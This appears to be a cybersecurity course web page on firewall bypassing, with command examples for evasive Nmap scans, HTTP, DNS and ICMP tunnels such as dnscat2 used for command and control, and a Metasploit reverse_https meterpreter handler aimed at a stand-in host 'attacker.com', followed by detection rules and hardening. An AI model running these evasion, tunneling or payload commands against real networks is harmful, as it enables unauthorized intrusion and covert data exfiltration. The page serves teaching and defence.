@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Firewall Bypassing - ABID HACKER</title>
+    
+    <!-- Bootstrap CSS CDN -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <!-- Navigation Bar -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
+        <div class="container">
+            <a class="navbar-brand" href="../../index.html">
+                <i class="fas fa-shield-alt"></i> ABID HACKER
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="../../index.html">Home</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../courses.html">Courses</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../about.html">About</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../contact.html">Contact</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="container my-5" style="margin-top: 100px !important;">
+        <div class="row">
+            <!-- Sidebar Navigation -->
+            <div class="col-lg-3">
+                <div class="card border-success sticky-top" style="top: 100px;">
+                    <div class="card-header bg-success text-white">
+                        <h6 class="mb-0">Firewall Bypassing</h6>
+                    </div>
+                    <div class="card-body p-0">
+                        <ul class="list-group list-group-flush">
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#introduction" class="text-success text-decoration-none">Introduction</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#firewall-types" class="text-success text-decoration-none">Firewall Types</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#bypass-techniques" class="text-success text-decoration-none">Bypass Techniques</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#tunneling" class="text-success text-decoration-none">Tunneling Methods</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#evasion-tools" class="text-success text-decoration-none">Evasion Tools</a>
+                            </li>
+                            <li class="list-group-item bg-dark border-success">
+                                <a href="#detection" class="text-success text-decoration-none">Detection & Defense</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Main Content Area -->
+            <div class="col-lg-9">
+                <div class="card border-success">
+                    <div class="card-header bg-success text-white">
+                        <h1 class="mb-0"><i class="fas fa-fire"></i> Firewall Bypassing Techniques</h1>
+                    </div>
+                    <div class="card-body">
+                        <!-- Introduction Section -->
+                        <section id="introduction" class="mb-5">
+                            <h2 class="text-success">Firewall Bypassing Overview</h2>
+                            <p class="lead">Firewall bypassing involves techniques to circumvent network security controls and access restricted resources or establish unauthorized connections.</p>
+                            
+                            <div class="alert alert-info">
+                                <i class="fas fa-info-circle"></i> <strong>Learning Objective:</strong> Understand firewall technologies, learn bypass techniques, and implement effective countermeasures.
+                            </div>
+
+                            <h3 class="text-success mt-4">Why Bypass Firewalls?</h3>
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <ul>
+                                        <li><strong>Penetration Testing:</strong> Assess network security</li>
+                                        <li><strong>Red Team Operations:</strong> Simulate advanced threats</li>
+                                        <li><strong>Incident Response:</strong> Understand attack vectors</li>
+                                        <li><strong>Security Research:</strong> Discover vulnerabilities</li>
+                                    </ul>
+                                </div>
+                                <div class="col-md-6">
+                                    <ul>
+                                        <li><strong>Network Analysis:</strong> Test firewall effectiveness</li>
+                                        <li><strong>Compliance Testing:</strong> Verify security controls</li>
+                                        <li><strong>Defense Improvement:</strong> Strengthen security posture</li>
+                                        <li><strong>Training:</strong> Educate security teams</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- Firewall Types Section -->
+                        <section id="firewall-types" class="mb-5">
+                            <h2 class="text-success">Types of Firewalls</h2>
+                            
+                            <h3 class="text-success mt-4">Packet Filtering Firewalls</h3>
+                            <div class="card bg-dark border-success mb-3">
+                                <div class="card-body">
+                                    <p class="text-light">Filter packets based on IP addresses, ports, and protocols.</p>
+                                    <div class="terminal">
+# Typical packet filter rules
+iptables -A INPUT -s 192.168.1.0/24 -p tcp --dport 22 -j ACCEPT
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+iptables -A INPUT -p tcp --dport 443 -j ACCEPT
+iptables -A INPUT -j DROP
+
+# Bypass techniques:
+- Source IP spoofing
+- Port hopping
+- Protocol manipulation
+- Fragmentation attacks
+                                    </div>
+                                </div>
+                            </div>
+
+                            <h3 class="text-success mt-4">Stateful Firewalls</h3>
+                            <div class="card bg-dark border-success mb-3">
+                                <div class="card-body">
+                                    <p class="text-light">Track connection states and allow return traffic for established connections.</p>
+                                    <div class="terminal">
+# Stateful firewall rules
+iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+iptables -A INPUT -p tcp --dport 80 -m state --state NEW -j ACCEPT
+
+# Bypass techniques:
+- TCP sequence prediction
+- Connection hijacking
+- State table exhaustion
+- Timing attacks
+                                    </div>
+                                </div>
+                            </div>
+
+                            <h3 class="text-success mt-4">Application Layer Firewalls</h3>
+                            <div class="card bg-dark border-success mb-3">
+                                <div class="card-body">
+                                    <p class="text-light">Inspect application-layer protocols and content.</p>
+                                    <div class="terminal">
+# WAF rules example
+SecRule REQUEST_URI "@contains /admin" "id:1001,deny,status:403"
+SecRule ARGS "@detectSQLi" "id:1002,deny,status:403"
+
+# Bypass techniques:
+- Protocol tunneling
+- Encoding/obfuscation
+- Application-specific exploits
+- SSL/TLS tunneling
+                                    </div>
+                                </div>
+                            </div>
+
+                            <h3 class="text-success mt-4">Next-Generation Firewalls (NGFW)</h3>
+                            <div class="card bg-dark border-success">
+                                <div class="card-body">
+                                    <p class="text-light">Combine traditional firewall features with advanced inspection capabilities.</p>
+                                    <div class="terminal">
+# NGFW features:
+- Deep packet inspection (DPI)
+- Application awareness
+- User identification
+- Intrusion prevention
+- SSL inspection
+- Threat intelligence integration
+
+# Advanced bypass techniques required:
+- Multi-layer evasion
+- Encrypted tunnels
+- Legitimate service abuse
+- Zero-day exploits
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- Bypass Techniques Section -->
+                        <section id="bypass-techniques" class="mb-5">
+                            <h2 class="text-success">Common Bypass Techniques</h2>
+                            
+                            <h3 class="text-success mt-4">Port Manipulation</h3>
+                            <div class="terminal">
+# Port hopping with Nmap
+nmap -p 80,443,8080,8443 target.com
+nmap -p- --top-ports 1000 target.com
+
+# Source port manipulation
+nmap --source-port 53 target.com  # DNS port
+nmap --source-port 20 target.com  # FTP data port
+
+# Decoy scanning
+nmap -D RND:10 target.com
+nmap -D 192.168.1.1,192.168.1.2,ME target.com
+
+# Idle scan (zombie host)
+nmap -sI zombie_host target.com
+                            </div>
+
+                            <h3 class="text-success mt-4">Protocol Manipulation</h3>
+                            <div class="terminal">
+# TCP flag manipulation
+nmap -sF target.com  # FIN scan
+nmap -sN target.com  # NULL scan
+nmap -sX target.com  # Xmas scan
+
+# Custom TCP flags with hping3
+hping3 -S -p 80 target.com  # SYN scan
+hping3 -F -P -U -p 80 target.com  # FIN, PUSH, URG flags
+
+# IP fragmentation
+nmap -f target.com  # Fragment packets
+nmap -ff target.com  # Use small fragments
+hping3 -f -p 80 target.com
+
+# IPv6 tunneling
+# Many firewalls don't properly filter IPv6
+ping6 target.com
+nmap -6 target.com
+                            </div>
+
+                            <h3 class="text-success mt-4">Timing and Evasion</h3>
+                            <div class="terminal">
+# Slow scanning to avoid detection
+nmap -T1 target.com  # Paranoid timing
+nmap -T2 target.com  # Sneaky timing
+nmap --scan-delay 5s target.com
+
+# Randomize scan order
+nmap --randomize-hosts target1.com target2.com target3.com
+
+# Spoof MAC address
+nmap --spoof-mac 0 target.com
+nmap --spoof-mac Dell target.com
+
+# Use proxies
+nmap --proxies http://proxy1:8080,http://proxy2:8080 target.com
+
+# Bad checksum packets (some firewalls ignore these)
+nmap --badsum target.com
+                            </div>
+                        </section>
+
+                        <!-- Tunneling Section -->
+                        <section id="tunneling" class="mb-5">
+                            <h2 class="text-success">Tunneling Methods</h2>
+                            
+                            <h3 class="text-success mt-4">HTTP/HTTPS Tunneling</h3>
+                            <div class="terminal">
+# HTTP tunnel with HTTPTunnel
+# Server setup
+htts -F localhost:22 80
+
+# Client connection
+httc -F 8080 server.com:80
+ssh -p 8080 user@localhost
+
+# HTTPS tunnel with stunnel
+# stunnel.conf
+[https-tunnel]
+accept = 8443
+connect = target.com:22
+cert = /path/to/cert.pem
+
+# Corkscrew for HTTP proxy tunneling
+ssh -o ProxyCommand="corkscrew proxy.com 8080 target.com 22" user@target.com
+
+# HTTP tunnel with chisel
+# Server
+chisel server --port 8080 --reverse
+
+# Client
+chisel client server.com:8080 R:22:localhost:22
+                            </div>
+
+                            <h3 class="text-success mt-4">DNS Tunneling</h3>
+                            <div class="terminal">
+# Iodine DNS tunnel
+# Server
+iodined -f -c -P password 10.0.0.1/24 tunnel.domain.com
+
+# Client
+iodine -f -P password tunnel.domain.com
+
+# DNSCat2 for command and control
+# Server
+dnscat2-server tunnel.domain.com
+
+# Client
+dnscat2 tunnel.domain.com
+
+# DNS2TCP tunnel
+# Server config
+listen = 0.0.0.0
+port = 53
+user = nobody
+chroot = /var/empty
+domain = tunnel.domain.com
+resources = ssh:127.0.0.1:22
+
+# Client
+dns2tcpc -r ssh -z tunnel.domain.com
+                            </div>
+
+                            <h3 class="text-success mt-4">ICMP Tunneling</h3>
+                            <div class="terminal">
+# ICMP tunnel with ptunnel
+# Server
+ptunnel -x password
+
+# Client
+ptunnel -p server.com -lp 8080 -da target.com -dp 22 -x password
+ssh -p 8080 user@localhost
+
+# ICMP tunnel with icmptunnel
+# Server
+./icmptunnel -s
+
+# Client
+./icmptunnel -c server.com
+# Creates tun0 interface for tunneled traffic
+
+# Hans ICMP tunnel
+# Server
+hans -s 10.1.2.0/24 -p password
+
+# Client
+hans -c server.com -p password
+                            </div>
+
+                            <h3 class="text-success mt-4">Application Layer Tunneling</h3>
+                            <div class="terminal">
+# SSH tunneling
+# Local port forwarding
+ssh -L 8080:target.com:80 user@jumphost.com
+
+# Remote port forwarding
+ssh -R 8080:localhost:22 user@external.com
+
+# Dynamic port forwarding (SOCKS proxy)
+ssh -D 1080 user@jumphost.com
+
+# SSH over HTTP with proxytunnel
+proxytunnel -p proxy.com:8080 -d target.com:22 -a 8022
+ssh -p 8022 user@localhost
+
+# SSL/TLS tunneling with stunnel
+# stunnel.conf
+[ssh-ssl]
+accept = 443
+connect = 127.0.0.1:22
+cert = /path/to/cert.pem
+
+# OpenVPN over HTTP
+# Use port 443 and TCP mode
+port 443
+proto tcp
+dev tun
+                            </div>
+                        </section>
+
+                        <!-- Evasion Tools Section -->
+                        <section id="evasion-tools" class="mb-5">
+                            <h2 class="text-success">Firewall Evasion Tools</h2>
+                            
+                            <h3 class="text-success mt-4">Network Scanners</h3>
+                            <div class="terminal">
+# Nmap with evasion techniques
+nmap -sS -f -D RND:10 --source-port 53 --data-length 25 target.com
+
+# Masscan for high-speed scanning
+masscan -p1-65535 10.0.0.0/8 --rate=1000 --source-port 61000
+
+# Unicornscan with custom payloads
+unicornscan -mT -r 1000 target.com:1-65535
+
+# Zmap for internet-wide scanning
+zmap -p 80 -o results.txt 10.0.0.0/8
+
+# Custom packet crafting with Scapy
+from scapy.all import *
+packet = IP(dst="target.com")/TCP(dport=80, flags="S")
+send(packet)
+                            </div>
+
+                            <h3 class="text-success mt-4">Tunneling Tools</h3>
+                            <div class="terminal">
+# Proxychains for traffic routing
+# /etc/proxychains.conf
+[ProxyList]
+socks5 127.0.0.1 1080
+http 192.168.1.10 8080
+
+proxychains nmap target.com
+proxychains ssh user@target.com
+
+# Tor for anonymity
+torify nmap target.com
+torsocks ssh user@target.com
+
+# Shadowsocks proxy
+# Server
+ss-server -s 0.0.0.0 -p 8388 -k password -m aes-256-cfb
+
+# Client
+ss-local -s server.com -p 8388 -k password -m aes-256-cfb -l 1080
+
+# V2Ray advanced proxy
+# Server config
+{
+  "inbounds": [{
+    "port": 443,
+    "protocol": "vmess",
+    "settings": {
+      "clients": [{"id": "uuid", "level": 1}]
+    },
+    "streamSettings": {
+      "network": "ws",
+      "wsSettings": {"path": "/path"}
+    }
+  }]
+}
+                            </div>
+
+                            <h3 class="text-success mt-4">Payload Delivery</h3>
+                            <div class="terminal">
+# Metasploit evasion modules
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST attacker.com
+set LPORT 443
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+
+# Veil for payload generation
+./Veil.py -t Evasion -p python/meterpreter/rev_https.py
+./Veil.py -t Ordnance -p auxiliary/pyinstaller.py
+
+# Empire for post-exploitation
+# Generate stager
+(Empire) > usestager multi/launcher
+(Empire) > set Listener http
+(Empire) > generate
+
+# Covenant C2 framework
+# Generate launcher
+Grunt> Launcher
+Grunt> set Type PowerShell
+Grunt> set CommType HTTP
+                            </div>
+                        </section>
+
+                        <!-- Detection Section -->
+                        <section id="detection" class="mb-5">
+                            <h2 class="text-success">Detection & Defense</h2>
+                            
+                            <h3 class="text-success mt-4">Monitoring Techniques</h3>
+                            <div class="terminal">
+# Network traffic analysis
+# Monitor for unusual patterns
+tcpdump -i any -n -c 1000 | grep -E "(fragment|unusual)"
+
+# Detect port scanning
+iptables -A INPUT -p tcp --dport 1:1024 -m recent --name portscan --set
+iptables -A INPUT -p tcp --dport 1:1024 -m recent --name portscan --rcheck --seconds 60 --hitcount 10 -j DROP
+
+# Monitor DNS tunneling
+# Look for unusual DNS queries
+tail -f /var/log/named/query.log | grep -E '[A-Za-z0-9+/]{30,}'
+
+# Detect ICMP tunneling
+tcpdump -i any icmp | grep -E "length [5-9][0-9]|length [1-9][0-9][0-9]"
+
+# Monitor SSL/TLS anomalies
+# Unusual certificate usage
+openssl s_client -connect target.com:443 -servername target.com < /dev/null 2>/dev/null | openssl x509 -noout -text
+                            </div>
+
+                            <h3 class="text-success mt-4">Firewall Hardening</h3>
+                            <div class="terminal">
+# Advanced iptables rules
+# Drop fragmented packets
+iptables -A INPUT -f -j DROP
+
+# Limit connection rate
+iptables -A INPUT -p tcp --dport 22 -m recent --name ssh --set
+iptables -A INPUT -p tcp --dport 22 -m recent --name ssh --rcheck --seconds 60 --hitcount 3 -j DROP
+
+# Block common evasion techniques
+iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP  # NULL scan
+iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP   # Xmas scan
+iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP
+
+# Geo-blocking
+iptables -A INPUT -m geoip --src-cc CN,RU,KP -j DROP
+
+# Application-layer filtering with Suricata
+# /etc/suricata/rules/local.rules
+alert tcp any any -> any 80 (msg:"Possible HTTP tunnel"; content:"CONNECT"; http_method; sid:1001;)
+alert dns any any -> any 53 (msg:"DNS tunneling detected"; content:"|00 10|"; sid:1002;)
+                            </div>
+
+                            <h3 class="text-success mt-4">Deep Packet Inspection</h3>
+                            <div class="terminal">
+# Snort rules for evasion detection
+# Detect fragmentation attacks
+alert ip any any -> any any (msg:"IP fragmentation attack"; fragbits:M; sid:1003;)
+
+# Detect port scanning
+alert tcp any any -> any any (msg:"Port scan detected"; flags:S; threshold:type both, track by_src, count 10, seconds 60; sid:1004;)
+
+# Detect tunneling protocols
+alert tcp any any -> any 53 (msg:"TCP over DNS port"; sid:1005;)
+alert icmp any any -> any any (msg:"Large ICMP packet"; dsize:>100; sid:1006;)
+
+# pfSense configuration for advanced filtering
+# Enable advanced features
+- Intrusion Detection/Prevention
+- Traffic Shaper
+- Package Manager (Snort, Suricata)
+- Captive Portal
+- VPN monitoring
+
+# Cisco ASA advanced features
+# Enable application inspection
+policy-map global_policy
+ class inspection_default
+  inspect dns
+  inspect http
+  inspect icmp
+  inspect ssh
+                            </div>
+
+                            <h3 class="text-success mt-4">Incident Response</h3>
+                            <div class="terminal">
+# Firewall bypass incident response
+1. Identify the bypass method used
+2. Analyze network logs and traffic patterns
+3. Update firewall rules to block the technique
+4. Implement additional monitoring
+5. Review and update security policies
+
+# Log analysis for bypass detection
+# Analyze connection patterns
+awk '{print $1}' /var/log/firewall.log | sort | uniq -c | sort -nr
+
+# Check for unusual port usage
+netstat -an | grep ESTABLISHED | awk '{print $4}' | cut -d: -f2 | sort | uniq -c | sort -nr
+
+# Monitor for tunneling indicators
+grep -E "(tunnel|proxy|forward)" /var/log/syslog
+
+# Automated response script
+#!/bin/bash
+# Block suspicious IP addresses
+SUSPICIOUS_IPS=$(tail -1000 /var/log/firewall.log | grep "DENY" | awk '{print $8}' | sort | uniq -c | awk '$1 > 50 {print $2}')
+
+for ip in $SUSPICIOUS_IPS; do
+    iptables -A INPUT -s $ip -j DROP
+    echo "Blocked suspicious IP: $ip"
+done
+                            </div>
+                        </section>
+
+                        <!-- Navigation -->
+                        <div class="d-flex justify-content-between mt-5">
+                            <a href="dns-security.html" class="btn btn-outline-success">
+                                <i class="fas fa-arrow-left"></i> Previous: DNS Security
+                            </a>
+                            <a href="../python/web-scraping.html" class="btn btn-success">
+                                Next: Web Scraping <i class="fas fa-arrow-right"></i>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-dark text-white py-4 mt-5">
+        <div class="container">
+            <div class="text-center">
+                <p>&copy; 2024 ABID HACKER. Created by Abid Mehmood - Professional Web Designer</p>
+                <p>Email: abidbusiness@gmail.com | Phone: 03029382306</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Bootstrap JS CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <!-- jQuery CDN -->
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    
+    <!-- Custom JS -->
+    <script src="../../js/script.js"></script>
+</body>
+</html>
